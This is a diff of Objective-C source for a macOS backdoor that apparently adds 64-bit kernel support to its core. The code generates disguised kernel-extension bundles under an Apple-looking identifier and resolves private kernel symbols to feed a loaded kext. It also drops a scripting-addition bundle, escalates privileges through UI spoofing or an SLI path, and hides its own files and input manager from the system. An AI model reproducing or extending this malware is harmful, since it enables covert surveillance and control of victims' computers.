@@ -257,6 +257,9 @@ static void computerWillShutdown(CFMachPortRef port,
        withArguments: nil
         waitUntilEnd: NO];
   
+#ifdef DEBUG_CORE
+  warnLog(@"Exiting after having launched (%@)", mSpoofedName);
+#endif
   exit(0);
 }
 
@@ -1478,29 +1481,41 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if ([gBackdoorName isLessThan: gBackdoorUpdateName])
     {
+#ifdef DEBUG_CORE
+      infoLog(@"gBackdoor");
+#endif
       gConfigurationName = [_encryption scrambleForward: _backdoorName
                                                    seed: 1];
     }
   else
     {
+#ifdef DEBUG_CORE
+      infoLog(@"gBackdoor Update");
+#endif
       gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName
                                                    seed: 1];
     }
-  
+
   gConfigurationUpdateName  = [_encryption scrambleForward: gConfigurationName
                                                       seed: ALPHABET_LEN / 2];
   gInputManagerName         = [_encryption scrambleForward: gConfigurationName
                                                       seed: 2];
-  gKextName                 = [_encryption scrambleForward: gConfigurationName
+  gKext32Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 4];
-  
+  gKext64Name               = [_encryption scrambleForward: gConfigurationName
+                                                      seed: 16];
+
 #ifdef DEBUG_CORE
-  infoLog(@"name       : %@", gBackdoorName);
-  infoLog(@"update name: %@", gBackdoorUpdateName);
-  infoLog(@"conf name  : %@", gConfigurationName);
-  infoLog(@"conf update: %@", gConfigurationUpdateName);
-  infoLog(@"im update  : %@", gInputManagerName);
-  infoLog(@"kext name  : %@", gKextName);
+  if ([gBackdoorName isEqualToString: @"System Preferences"] == NO)
+    {
+      infoLog(@"name       : %@", gBackdoorName);
+      infoLog(@"update name: %@", gBackdoorUpdateName);
+      infoLog(@"conf name  : %@", gConfigurationName);
+      infoLog(@"conf update: %@", gConfigurationUpdateName);
+      infoLog(@"imanager   : %@", gInputManagerName);
+      infoLog(@"kext32 name: %@", gKext32Name);
+      infoLog(@"kext64 name: %@", gKext64Name);
+    }
 #endif
   
   [_encryption release];
@@ -1541,14 +1556,12 @@ static void computerWillShutdown(CFMachPortRef port,
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 8];
   NSMutableDictionary *innerDict;
   
-  if (gOSMajor    == 10
-      && gOSMinor == 5)
+  if ([gUtil isLeopard])
     {
       innerDict = [NSMutableDictionary dictionaryWithCapacity: 1];
       [innerDict setObject: taskOutput forKey: @"com.apple.kernel"];
     }
-  else if (gOSMajor     == 10
-           && gOSMinor  == 6)
+  else
     {
       innerDict = [NSMutableDictionary dictionaryWithCapacity: 2];
       [innerDict setObject: taskOutput forKey: @"com.apple.kpi.bsd"];
@@ -1556,13 +1569,27 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
-  [rootObj setObject: gKextName forKey: @"CFBundleExecutable"];
   [rootObj setObject: @"com.apple.mdworker" forKey: @"CFBundleIdentifier"];
   [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
   [rootObj setObject: @"KEXT" forKey: @"CFBundlePackageType"];
   [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
   [rootObj setObject: @"2.0" forKey: @"CFBundleVersion"];
   [rootObj setObject: innerDict forKey: @"OSBundleLibraries"];
+
+  if (is64bitKernel())
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"Configuring kext64");
+#endif
+      [rootObj setObject: gKext64Name forKey: @"CFBundleExecutable"];
+    }
+  else
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"Configuring kext32");
+#endif
+      [rootObj setObject: gKext32Name forKey: @"CFBundleExecutable"];
+    }
   
   NSString *err;
   NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
@@ -1582,49 +1609,100 @@ static void computerWillShutdown(CFMachPortRef port,
                           [[NSBundle mainBundle] bundlePath]];
   mkdir([_backdoorContentPath UTF8String], 0755);
   
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName];
-  mkdir([_backdoorContentPath UTF8String], 0755);
-  
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName,
-                          @"Contents"];
-  mkdir([_backdoorContentPath UTF8String], 0755);
-  
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName,
-                          @"Contents/Resources"];
-  mkdir([_backdoorContentPath UTF8String], 0755);
-  
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName,
-                          @"Contents/MacOS"];
-  mkdir([_backdoorContentPath UTF8String], 0755);
-  
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName,
-                          @"/Contents/Info.plist"];
+  if (is64bitKernel())
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name,
+                              @"Contents"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name,
+                              @"Contents/Resources"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name,
+                              @"Contents/MacOS"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name,
+                              @"/Contents/Info.plist"];
+    }
+  else
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name,
+                              @"Contents"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name,
+                              @"Contents/Resources"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name,
+                              @"Contents/MacOS"];
+      mkdir([_backdoorContentPath UTF8String], 0755);
+
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name,
+                              @"/Contents/Info.plist"];
+    }
   
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
 
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
-                          [[NSBundle mainBundle] bundlePath],
-                          gKextName,
-                          @"/Contents/MacOS",
-                          gKextName];
+  NSString *tempKextDir;
 
-  NSString *tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
-                           [[NSBundle mainBundle] bundlePath],
-                           gKextName];
+  if (is64bitKernel())
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name,
+                              @"/Contents/MacOS",
+                              gKext64Name];
+    
+      tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
+                     [[NSBundle mainBundle] bundlePath],
+                     gKext64Name];
+    }
+  else
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name,
+                              @"/Contents/MacOS",
+                              gKext32Name];
+    
+      tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
+                     [[NSBundle mainBundle] bundlePath],
+                     gKext32Name];
+    }
+
 #ifdef DEBUG_CORE
-  infoLog(@"tempKextDir: %@", tempKextDir);
-  infoLog(@"backdoorContentPath: %@", _backdoorContentPath);
+  infoLog(@"kext origin     : %@", tempKextDir);
+  infoLog(@"kext destination: %@", _backdoorContentPath);
 #endif
 
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
@@ -1634,9 +1712,18 @@ static void computerWillShutdown(CFMachPortRef port,
   [tempKextDir release];
   [taskOutput release];
 
-  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
-                       [[NSBundle mainBundle] bundlePath],
-                       gKextName];
+  if (is64bitKernel())
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext64Name];
+    }
+  else
+    {
+      _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                              [[NSBundle mainBundle] bundlePath],
+                              gKext32Name];
+    }
   NSArray *arguments = [NSArray arrayWithObjects:
                         @"-R",
                         @"root:wheel",
@@ -1797,8 +1884,6 @@ static void computerWillShutdown(CFMachPortRef port,
     {
 #ifdef DEBUG_CORE
       infoLog(@"Registering NSPort to NameServer");
-      infoLog(@"uid : %d", getuid());
-      infoLog(@"euid: %d", geteuid());
 #endif
       
       //
@@ -2110,27 +2195,38 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (void)_dropOsaxBundle
-{  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
+{
+  NSMutableString *osaxPath = [[NSMutableString alloc]
+                               initWithFormat: @"/Library/ScriptingAdditions/%@",
+                               EXT_BUNDLE_FOLDER];
+  if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
     {
-      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
+      [[NSFileManager defaultManager] removeItemAtPath: osaxPath
                                                  error: nil];
     }
-
+  
   //
   // Scripting folder
   //
   mkdir("/Library/ScriptingAdditions", 0755);
-  mkdir("/Library/ScriptingAdditions/appleOsax", 0755);
-  mkdir("/Library/ScriptingAdditions/appleOsax/Contents", 0755);
-  mkdir("/Library/ScriptingAdditions/appleOsax/Contents/MacOS", 0755);
-  mkdir("/Library/ScriptingAdditions/appleOsax/Contents/Resources", 0755);
+  mkdir([osaxPath UTF8String], 0755);
+  
+  [osaxPath appendString: @"/Contents"];
+  mkdir([osaxPath UTF8String], 0755);
+  
+  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", osaxPath];
+  mkdir([tmpPath UTF8String], 0755);
+  [tmpPath release];
+  
+  [osaxPath appendString: @"/Resources"];
+  mkdir([osaxPath UTF8String], 0755);
 
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
                        EXT_BUNDLE_FOLDER,
                        gInputManagerName];
-
+  [osaxPath release];
+  
 #ifdef DEBUG_CORE
   infoLog(@"destination osax %@", destDir);
 #endif
@@ -2173,7 +2269,10 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(@"info.plist for osax %@", info_pl);
 #endif
   
-  [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
+  NSString *infoPath = [NSString stringWithFormat:
+                        @"/Library/ScriptingAdditions/%@/Contents/Info.plist",
+                        EXT_BUNDLE_FOLDER];
+  [info_pl writeToFile: infoPath
             atomically: NO
               encoding: NSASCIIStringEncoding
                  error: NULL];
@@ -2183,7 +2282,11 @@ static void computerWillShutdown(CFMachPortRef port,
   
   NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
   
-  [resource_r writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Resources/appleOsax.r" 
+  NSString *rPath = [NSString stringWithFormat:
+                     @"/Library/ScriptingAdditions/%@/Contents/Resources/appleOsax.r",
+                     EXT_BUNDLE_FOLDER];
+  
+  [resource_r writeToFile: rPath
                atomically: NO
                  encoding: NSASCIIStringEncoding
                     error: NULL];
@@ -2191,19 +2294,15 @@ static void computerWillShutdown(CFMachPortRef port,
   [resource_r release];
 }
 
-
 - (void)_solveKernelSymbolsForKext
 {
   int kernFD      = 0;
   int ret         = 0;
   int filesize    = 0;
   
-  unsigned int symAddress = 0;
-  
   void *imageBase = NULL;
   char filename[] = "/mach_kernel";
   struct stat sb;
-  symbol_t sym;
   
   unsigned int kmod_hash                = 0xdd2c36d6; // _kmod
   unsigned int nsysent_hash             = 0xb366074d; // _nsysent
@@ -2267,71 +2366,157 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(@"file mapped @ 0x%lx\n", (unsigned long)imageBase);
 #endif
   
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, kmod_hash);
-  sym.hash   = kmod_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, nsysent_hash);
-  sym.hash   = nsysent_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, tasks_hash);
-  sym.hash   = tasks_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, allproc_hash);
-  sym.hash   = allproc_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, tasks_count_hash);
-  sym.hash   = tasks_count_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, nprocs_hash);
-  sym.hash   = nprocs_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
-  sym.hash   = tasks_threads_lock_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, proc_lock_hash);
-  sym.hash   = proc_lock_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, proc_unlock_hash);
-  sym.hash   = proc_unlock_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
-  sym.hash   = proc_list_lock_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
-  
-  // Sending Symbol
-  symAddress = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
-  sym.hash   = proc_list_unlock_hash;
-  sym.symbol = symAddress;
-  ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM, &sym);
+  BOOL kernel64 = is64bitKernel();
+  if (kernel64)
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"solving symbols for 64bit kernel");
+#endif
+      symbol64_t sym;
+      uint64_t symAddress = 0;
+      // 64bit kernel image
+      // thus we need to map the 64bit part
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, kmod_hash);
+      sym.hash   = kmod_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, nsysent_hash);
+      sym.hash   = nsysent_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, tasks_hash);
+      sym.hash   = tasks_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, allproc_hash);
+      sym.hash   = allproc_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, tasks_count_hash);
+      sym.hash   = tasks_count_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, nprocs_hash);
+      sym.hash   = nprocs_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
+      sym.hash   = tasks_threads_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, proc_lock_hash);
+      sym.hash   = proc_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
+      sym.hash   = proc_unlock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
+      sym.hash   = proc_list_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
+      sym.hash   = proc_list_unlock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+    }
+  else
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"solving symbols for 32bit kernel");
+#endif
+      symbol32_t sym;
+      unsigned int symAddress = 0;
+      
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, kmod_hash);
+      sym.hash   = kmod_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, nsysent_hash);
+      sym.hash   = nsysent_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, tasks_hash);
+      sym.hash   = tasks_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, allproc_hash);
+      sym.hash   = allproc_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, tasks_count_hash);
+      sym.hash   = tasks_count_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, nprocs_hash);
+      sym.hash   = nprocs_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
+      sym.hash   = tasks_threads_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, proc_lock_hash);
+      sym.hash   = proc_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, proc_unlock_hash);
+      sym.hash   = proc_unlock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
+      sym.hash   = proc_list_lock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+
+      // Sending Symbol
+      symAddress = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
+      sym.hash   = proc_list_unlock_hash;
+      sym.symbol = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+    }
   
   munmap(imageBase, filesize);
   close(kernFD);
@@ -2361,7 +2546,7 @@ static void computerWillShutdown(CFMachPortRef port,
   // it now as the situation may no longer apply.
   //_setRootDomainProperty(CFSTR("System Shutdown"), kCFBooleanFalse);
   
-  if (gOSMajor == 10 && gOSMinor == 5)
+  if ([gUtil isLeopard])
     {
 #ifdef DEBUG_CORE
       infoLog(@"Registering notifications for Leopard");
@@ -2386,7 +2571,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutPointOfNoReturnNotificationToken);
     }
-  else if (gOSMajor == 10 && gOSMinor == 6)
+  else
     {
 #ifdef DEBUG_CORE
       infoLog(@"Registering notifications for Snow Leopard");
@@ -2466,11 +2651,16 @@ static void computerWillShutdown(CFMachPortRef port,
       
       // Let's guess all the required names
       [self _guessNames];
-      NSString *kextPath    = [[NSString alloc] initWithFormat:
-                               @"%@/%@/%@.kext",
-                               [[NSBundle mainBundle] bundlePath],
-                               @"Contents/Resources",
-                               gKextName];
+      NSString *kext32Path    = [[NSString alloc] initWithFormat:
+                                 @"%@/%@/%@.kext",
+                                 [[NSBundle mainBundle] bundlePath],
+                                 @"Contents/Resources",
+                                 gKext32Name];
+      NSString *kext64Path    = [[NSString alloc] initWithFormat:
+                                 @"%@/%@/%@.kext",
+                                 [[NSBundle mainBundle] bundlePath],
+                                 @"Contents/Resources",
+                                 gKext64Name];
       NSString *loaderPath  = [[NSString alloc] initWithFormat:
                                @"%@/%@",
                                [[NSBundle mainBundle] bundlePath],
@@ -2482,7 +2672,8 @@ static void computerWillShutdown(CFMachPortRef port,
       
       // init gUtil instance variables
       [gUtil setMBackdoorPath: [[NSBundle mainBundle] bundlePath]];
-      [gUtil setMKextPath: kextPath];
+      [gUtil setMKext32Path: kext32Path];
+      [gUtil setMKext64Path: kext64Path];
       [gUtil setMSLIPlistPath: SLI_PLIST];
       [gUtil setMServiceLoaderPath: loaderPath];
       [gUtil setMExecFlag: flagPath];
@@ -2491,7 +2682,8 @@ static void computerWillShutdown(CFMachPortRef port,
       gControlFlagLock = [[NSLock alloc] init];
       gSuidLock        = [[NSLock alloc] init];
       
-      [kextPath release];
+      [kext32Path release];
+      [kext64Path release];
       [loaderPath release];
       [flagPath release];
     }
@@ -2569,7 +2761,22 @@ static void computerWillShutdown(CFMachPortRef port,
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
 
+  // First off check if we support the OS
+  if (gOSMajor != 10
+      || (gOSMajor == 10 && gOSMinor < 5)
+      || (gOSMajor == 10 && gOSMinor > 7))
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Unsupported OS version (%@.%@.%@)",
+               gOSMajor, gOSMinor, gOSBugFix);
+#endif
+      return NO;
+    }
   
+#ifdef DEBUG_CORE
+  infoLog(@"uid : %d", getuid());
+  infoLog(@"euid: %d", geteuid());
+#endif
   
   NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
                            [[NSBundle mainBundle] bundlePath]];
@@ -2638,17 +2845,17 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"SLIPLIST Mode ON");
 #endif
-      if (gOSMajor == 10 && gOSMinor == 5)
+      if ([gUtil isLeopard])
         {
 #ifdef DEBUG_CORE
-          infoLog(@"System is Leopard");
+          infoLog(@"SLI on Leopard");
 #endif
           sliSuccess = [self _SLIEscalation];
         }
-      else if (gOSMajor == 10 && gOSMinor == 6)
+      else
         {
 #ifdef DEBUG_CORE
-          warnLog(@"SLIPLIST on Snow Leopard, just going with noprivs");
+          warnLog(@"SLI on >10.5, just going with noprivs");
 #endif
           noPrivs = YES;
         }
@@ -2656,8 +2863,37 @@ static void computerWillShutdown(CFMachPortRef port,
   else if ([workingMode isEqualToString: UISPOOF])
     {
 #ifndef NO_UISPOOF
-      uiSuccess = [self _UISpoof];
-#else
+      // As of now unsupported on Lion
+      if (gOSMajor == 10 && gOSMinor == 7)
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"Skipping UI Spoof on Lion");
+#endif
+          //uiSuccess = YES;
+          NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
+                   [[NSBundle mainBundle] bundlePath],
+                   @"mdworker.flg"];
+#ifdef DEBUG_CORE
+          infoLog(@"Looking for mdworker.flg");
+#endif
+
+          if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
+                                                    isDirectory: NO])
+            {
+#ifdef DEBUG_CORE
+              warnLog(@"mdworker.flg not found. Relaunching through launchd");
+#endif
+              [gUtil dropExecFlag];
+            }
+        }
+      else
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"UI Spoofing");
+#endif
+          uiSuccess = [self _UISpoof];
+        }
+#else // NO_UISPOOF
       uiSuccess = YES;
 #endif
     }
@@ -2666,7 +2902,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"Dev mode on");
       
-      sliSuccess = [self _SLIEscalation];
+      uiSuccess   = YES;
+      sliSuccess  = YES;
+      noPrivs     = YES;
 #endif
     }
   
@@ -2722,8 +2960,6 @@ static void computerWillShutdown(CFMachPortRef port,
     {
 #ifdef DEBUG_CORE
       warnLog(@"Backdoor has not been made resident yet");
-      infoLog(@"sliSuccess: %d", sliSuccess);
-      infoLog(@"workingMode: %@", ([workingMode isEqualToString: SLIPLIST]) ? @"SLIPLIST" : @"UISPOOF");
 #endif
       
       if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
@@ -2789,14 +3025,7 @@ static void computerWillShutdown(CFMachPortRef port,
           // Now it's time for all the Info.plist mess
           // we need to create the fs hierarchy for the input manager and kext
           //
-          if (gOSMajor == 10 && gOSMinor == 6)
-            {
-#ifdef DEBUG_CORE
-              infoLog(@"Dropping OSAX");
-#endif
-              [self _dropOsaxBundle];
-            }
-          else if (gOSMajor == 10 && gOSMinor == 5)
+          if ([gUtil isLeopard])
             {
 #ifdef DEBUG_CORE
               infoLog(@"Dropping input manager");
@@ -2807,6 +3036,13 @@ static void computerWillShutdown(CFMachPortRef port,
                   errorLog(@"Error while installing input manager");
 #endif
                 }
+            }
+          else
+            {
+#ifdef DEBUG_CORE
+              infoLog(@"Dropping OSAX");
+#endif
+              [self _dropOsaxBundle];
             }
         }
     }
@@ -2827,7 +3063,8 @@ static void computerWillShutdown(CFMachPortRef port,
           warnLog(@"connectKext failed, trying to load the KEXT");
 #endif
 
-          if ([gUtil loadKext] == YES)
+          BOOL res = is64bitKernel();
+          if ([gUtil loadKextFor64bit: res] == YES)
             {
 #ifdef DEBUG_CORE
               infoLog(@"KEXT loaded successfully");
@@ -2857,21 +3094,20 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"kext loaded");
 #endif
-      
       //
       // Since Snow Leopard doesn't export all the required symbols
       // we're gonna solve them from uspace and send 'em back to kspace
       //
       [self _solveKernelSymbolsForKext];
-      
+
       os_version_t os_ver;
       os_ver.major  = gOSMajor;
       os_ver.minor  = gOSMinor;
       os_ver.bugfix = gOSBugFix;
-      
+
       // Telling kext to find sysent based on OS version
       ret = ioctl(gBackdoorFD, MCHOOK_FIND_SYS, &os_ver);
-    
+
       //
       // Start hiding all the required paths
       //
@@ -2886,7 +3122,7 @@ static void computerWillShutdown(CFMachPortRef port,
       [backdoorPlist release];
     
       // Hide only inputmanager not osax
-      if (gOSMajor == 10 && gOSMinor == 5)
+      if ([gUtil isLeopard])
         {
 #ifdef DEBUG_CORE
           infoLog(@"Hiding InputManager");
@@ -2899,7 +3135,7 @@ static void computerWillShutdown(CFMachPortRef port,
       
           [inputManagerPath release];
         }
-      else if (gOSMajor == 10 && gOSMinor == 6)
+      else
         {
